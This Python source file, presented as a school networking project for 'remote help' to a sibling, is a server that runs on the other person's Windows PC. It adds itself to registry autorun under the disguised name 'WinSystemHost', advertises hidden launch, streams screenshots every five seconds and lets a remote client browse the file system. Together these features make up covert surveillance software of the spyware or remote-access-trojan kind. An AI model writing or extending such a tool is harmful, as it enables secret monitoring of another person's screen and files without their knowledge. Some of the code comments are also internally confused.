"""
=============================================================================
СЕРВЕРНАЯ ЧАСТЬ (Server) - у брата
=============================================================================
Образовательный проект: "Инструмент для удалённой помощи члену семьи"

Назначение: Программа устанавливается на ПК брата.
            Она передаёт скриншоты и файлы клиенту.

Автор: [Имя ученика]
Дата: 2026
Школа: [Название школы]
Предмет: Сетевые протоколы / Python

=============================================================================
ФУНКЦИИ:
- Скрытый запуск (без окна консоли)
- Автозапуск через реестр Windows
- Передача скриншотов каждые 5 секунд
- Передача списка файлов по команде
- Белый список IP-адресов
=============================================================================
"""

import socket       # Библиотека для работы с сетью (TCP/IP)
import pyautogui    # Библиотека для создания скриншотов
import os           # Библиотека для работы с файловой системой
import sys          # Библиотека для системных функций
import time         # Библиотека для работы со временем
import threading    # Библиотека для многозадачности
import base64       # Библиотека для кодирования данных (изображения)
import io           # Библиотека для работы с потоками данных
import winreg       # Библиотека для работы с реестром Windows
from PIL import Image  # Библиотека для работы с изображениями (Pillow)


# =============================================================================
# КОНФИГУРАЦИЯ СЕРВЕРА
# =============================================================================

# Порт для прослушивания входящих соединений
LISTEN_PORT = 5555

# Интервал отправки скриншотов в секундах
SCREENSHOT_INTERVAL = 5

# Имя ключа в реестре автозапуска
REG_KEY_NAME = "WinSystemHost"

# БЕЛЫЙ СПИСОК IP-адресов (разрешённые клиенты)
# Добавьте сюда IP-адрес вашего компьютера
# Чтобы узнать свой IP: в командной строке введите "ipconfig"
ALLOWED_IPS = [
    "192.168.31.11",  # Ваш IP-адрес (IP брата)
    # Добавьте больше IP при необходимости
]


# =============================================================================
# ФУНКЦИЯ: АВТОЗАПУСК ЧЕРЕЗ РЕЕСТР (auto_run)
# =============================================================================

def auto_run():
    """
    Функция добавляет программу в автозапуск через реестр Windows.
    Проверяет, есть ли программа уже в автозагрузке, и если нет - добавляет.
    
    Использует winreg для работы с реестром:
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    """
    try:
        # Определяем путь к запущенному файлу
        if getattr(sys, 'frozen', False):
            # Скомпилированный .exe
            exe_path = sys.executable
        else:
            # .py скрипт
            exe_path = sys.executable + " " + sys.argv[0]
        
        # Открываем ключ реестра
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ | winreg.KEY_WRITE
        )
        
        try:
            # Проверяем, существует ли уже ключ
            existing_value = winreg.QueryValueEx(key, REG_KEY_NAME)
            print(f"[Auto-Run] Уже в автозапуске: {existing_value[0]}")
        except FileNotFoundError:
            # Ключ не существует - добавляем новый
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, exe_path)
            print(f"[Auto-Run] Добавлено в автозапуск: {exe_path}")
        
        winreg.CloseKey(key)
        
    except PermissionError:
        print("[Auto-Run] Ошибка: нет прав для записи в реестр")
    except Exception as e:
        print(f"[Auto-Run] Ошибка: {e}")


# =============================================================================
# ФУНКЦИЯ: ПРОВЕРКА IP В БЕЛОМ СПИСКЕ
# =============================================================================

def is_ip_allowed(client_ip):
    """
    Проверяет, находится ли IP-адрес в белом списке.
    
    Параметры:
        client_ip - IP-адрес подключающегося клиента
    
    Возвращает:
        True - если IP разрешён, False - если запрещён
    """
    # Проверяем, есть ли IP в списке разрешённых
    if client_ip in ALLOWED_IPS:
        return True
    
    print(f"[Безопасность] Заблокирован запрос с IP: {client_ip}")
    return False


# =============================================================================
# ФУНКЦИЯ: ОТПРАВКА СКРИНШОТОВ
# =============================================================================

def send_screenshots(client_socket):
    """
    Отправляет скриншоты на подключённый клиент.
    """
    print("[Remote View] Модуль скриншотов запущен")
    
    while True:
        try:
            # Ждём перед следующим скриншотом
            time.sleep(SCREENSHOT_INTERVAL)
            
            # Делаем скриншот
            screenshot = pyautogui.screenshot()
            
            # Сжимаем изображение
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            image_data = buffer.getvalue()
            
            # Кодируем в base64
            encoded_data = base64.b64encode(image_data)
            
            # Отправляем размер данных
            size = len(encoded_data)
            client_socket.sendall(size.to_bytes(4, byteorder='big'))
            
            # Отправляем данные изображения
            client_socket.sendall(encoded_data)
            
        except Exception as e:
            print(f"[Remote View] Ошибка: {e}")
            break


# =============================================================================
# ФУНКЦИЯ: ОБРАБОТКА КОМАНД ОТ КЛИЕНТА
# =============================================================================

def handle_client_commands(client_socket, client_ip):
    """
    Обрабатывает команды от клиента (файловый браузер).
    """
    print(f"[File Explorer] Модуль файлового браузера запущен для {client_ip}")
    
    while True:
        try:
            # Получаем команду от клиента
            command = client_socket.recv(4096).decode('utf-8').strip()
            
            if not command:
                break
            
            print(f"[File Explorer] Получена команда: {command}")
            
            # Разбираем команду
            if ':' in command:
                cmd_type, cmd_path = command.split(':', 1)
            else:
                cmd_type = command
                cmd_path = ""
            
            # Выполняем команду
            if cmd_type == "LIST":
                # Получить список файлов
                try:
                    files = os.listdir(cmd_path)
                    result = []
                    for f in files:
                        full_path = os.path.join(cmd_path, f)
                        if os.path.isdir(full_path):
                            result.append(f"{f}|DIR")
                        else:
                            result.append(f"{f}|FILE")
                    
                    response = "\n".join(result)
                    client_socket.sendall(response.encode('utf-8'))
                    
                except Exception as e:
                    client_socket.sendall(f"ERROR: {str(e)}".encode('utf-8'))
            
            elif cmd_type == "INFO":
                # Получить информацию о файле
                try:
                    if os.path.isfile(cmd_path):
                        size = os.path.getsize(cmd_path)
                        info = f"FILE|{size} bytes"
                    elif os.path.isdir(cmd_path):
                        count = len(os.listdir(cmd_path))
                        info = f"DIR|{count} items"
                    else:
                        info = "NOT FOUND"
                    
                    client_socket.sendall(info.encode('utf-8'))
                    
                except Exception as e:
                    client_socket.sendall(f"ERROR: {str(e)}".encode('utf-8'))
            
            else:
                client_socket.sendall(b"UNKNOWN COMMAND")
                
        except Exception as e:
            print(f"[File Explorer] Ошибка: {e}")
            break


# =============================================================================
# ОСНОВНАЯ ФУНКЦИЯ: ЗАПУСК СЕРВЕРА
# =============================================================================

def start_server():
    """
    Запускает TCP-сервер и ожидает подключения клиентов.
    """
    print("=" * 50)
    print("  СЕРВЕР УДАЛЁННОЙ ПОМОЩИ")
    print(f"  Порт: {LISTEN_PORT}")
    print("=" * 50)
    
    # Настраиваем автозапуск
    auto_run()
    
    while True:
        try:
            # Создаём TCP-сокет
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Разрешаем переиспользование адреса
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Привязываем к порту
            server_socket.bind(('', LISTEN_PORT))
            
            # Слушаем порт
            server_socket.listen(1)
            print(f"[Сервер] Ожидание подключения на порту {LISTEN_PORT}...")
            
            # Принимаем подключение
            client_socket, client_address = server_socket.accept()
            client_ip = client_address[0]
            
            print(f"[Сервер] Получен запрос от: {client_ip}")
            
            # Проверяем IP в белом списке
            if not is_ip_allowed(client_ip):
                print(f"[Сервер] Отклонено: IP {client_ip} не в белом списке")
                client_socket.sendall(b"BLOCKED:IP not allowed")
                client_socket.close()
                continue
            
            print(f"[Сервер] Подключён: {client_ip}")
            
            # Отправляем подтверждение
            client_socket.sendall(b"CONNECTED")
            
            # Закрываем слушающий сокет
            server_socket.close()
            
            # Запускаем потоки
            screenshot_thread = threading.Thread(
                target=send_screenshots, 
                args=(client_socket,),
                daemon=True
            )
            screenshot_thread.start()
            
            explorer_thread = threading.Thread(
                target=handle_client_commands, 
                args=(client_socket, client_ip),
                daemon=True
            )
            explorer_thread.start()
            
            # Ждём завершения потоков
            screenshot_thread.join()
            explorer_thread.join()
            
        except Exception as e:
            print(f"[Сервер] Ошибка: {e}")
            time.sleep(5)


# =============================================================================
# ТОЧКА ВХОДА
# =============================================================================

if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        print("\n[Выход] Сервер остановлен")
    except Exception as e:
        print(f"[Критическая ошибка] {e}")